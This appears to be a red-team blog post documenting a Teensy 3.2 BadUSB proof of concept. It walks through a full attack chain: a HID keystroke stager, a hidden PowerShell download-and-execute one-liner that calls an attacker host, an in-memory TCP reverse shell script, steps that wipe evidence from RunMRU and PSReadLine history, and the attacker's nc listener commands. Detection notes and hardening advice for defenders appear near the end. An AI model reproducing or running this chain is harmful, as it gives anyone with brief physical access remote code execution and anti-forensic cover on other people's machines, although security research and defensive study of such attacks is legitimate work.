---
title: "Teensy BadUSB reverse shell POC"
date: "2026-05-07"
featured: true
description: "HID keyboard injection on a Teensy 3.2 chains into a fileless PowerShell reverse shell on Windows."
tags: ["badusb", "powershell", "windows", "red-team"]
repo: "https://github.com/kacigaya/teensy-reverse-shell"
---

For authorized testing only. Do not run against systems you do not own.

## Threat model

Assume less than 10 seconds of physical access to an unlocked Windows host. The goal is an interactive shell back to the attacker without writing artifacts to disk.

## Components

Two parts:

1. `stager/stager.ino`: Teensy 3.2 sketch that acts as a USB HID keyboard.
2. `shell.ps1`: PowerShell reverse shell, hosted over HTTP on the attacker box.

The Teensy registers as a generic keyboard. There is no driver prompt and no AV trigger from the device itself. Windows treats keystrokes from it as user input.

## Stage 1: HID injection

USB type set to `Keyboard + Mouse + Joystick` in Teensyduino. On plug-in:

1. Wait 3000 ms for enumeration.
2. `Win + R` opens the Run dialog.
3. Type the payload character by character at 80 ms per key. Lower delays drop characters on slow USB stacks.
4. `Enter` executes.

Payload command:

```cpp
const char PAYLOAD[] =
  "powershell -w h -nop -ExecutionPolicy Bypass -c "
  "\"&(IEX (New-Object Net.WebClient).DownloadString('http://172.20.10.4:8080/shell.ps1'))\"";
```

Flags:

| Flag | Effect |
|---|---|
| `-w h` | Hidden window, no console flash |
| `-nop` | Skip the user profile, faster start |
| `-ExecutionPolicy Bypass` | Per-process policy override, no registry write |
| `IEX` + `DownloadString` | Fetch and eval in memory |

`DownloadString` returns the body as a string. `IEX` evaluates it in the current PowerShell session. The script never touches the filesystem, so AMSI string inspection is the main detection surface, not on-disk scanning.

## Stage 2: Reverse shell

`shell.ps1` opens a TCP socket to the attacker IP and port, then loops:

```powershell
$client = New-Object System.Net.Sockets.TCPClient($i, $p)
$stream = $client.GetStream()
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
  $cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
  $out = (Invoke-Expression $cmd 2>&1 | Out-String)
  $sendback = $out + "PS " + (Get-Location).Path + "> "
  $bytes = ([text.encoding]::ASCII).GetBytes($sendback)
  $stream.Write($bytes, 0, $bytes.Length)
  $stream.Flush()
}
```

Connection is outbound from the victim. Egress filtering, not inbound rules, is what blocks this. On a flat home or coffee shop network, port 6969 outbound is usually allowed.

`Invoke-Expression` runs the received string in the current session, so it inherits the user token, working directory, and PowerShell modules.

## Stage 3: Cleanup

After the shell connects, the Teensy injects a second Run command that wipes two artifacts:

1. `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`. Holds the last commands typed into the Run dialog.
2. `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. Plaintext log of every interactive PowerShell command, written by PSReadLine.

Removal is silent and non-blocking. The shell session is unaffected because it runs under a separate `powershell.exe` process spawned by the first Run command.

## Attack chain

```
Teensy plugged in
  > enumerated as USB keyboard
  > Win+R opens Run
  > PowerShell one-liner typed and executed
  > shell.ps1 downloaded and IEX'd in memory
  > TCP connect-back to attacker:6969
  > attacker gets interactive shell
  > Teensy wipes RunMRU and PSReadLine history
```

Total time from plug-in to shell: about 6 seconds.

## Detection surface

What flags this in a defended environment:

- AMSI scans the script body after `DownloadString` returns. Plain `IEX` of a known reverse-shell pattern is fingerprinted by Defender.
- EDR: parent-child anomaly. `explorer.exe` spawning `powershell.exe` with `-w h -nop -ExecutionPolicy Bypass` and an `IEX` + `DownloadString` argument is a high-confidence signature.
- USB device control: enterprise endpoints often whitelist HID by VID/PID. A Teensy 3.2 reports as `0x16C0:0x0483`, which is not on standard vendor lists.
- Network: outbound connection to a non-RFC1918 IP on a high port from `powershell.exe` is logged by Sysmon event 3.

## Hardening notes for defenders

- Enable Constrained Language Mode for non-admin users. It breaks `Invoke-Expression` on arbitrary script bodies.
- Set `Set-PSReadLineOption -HistorySaveStyle SaveNothing` for high-risk hosts, or audit the file.
- Block Run dialog via `NoRun` group policy on kiosk and shared workstations.
- USB HID device control via Intune or third-party agent.
- Egress filter on workstation VLANs. Allow only 80/443 to known proxies.

## Configuration

Two values to change before use:

- `stager/stager.ino`: IP and port inside `PAYLOAD`.
- `shell.ps1`: default `$i` (IP) and `$p` (port).

Attacker side:

```bash
python3 -m http.server 8080   # serves shell.ps1
nc -lvnp 6969                 # catches the reverse shell
```

Flash `stager.ino` with USB Type set to `Keyboard + Mouse + Joystick` and the keyboard layout matching the target locale. Wrong layout means wrong characters typed and the payload fails silently.
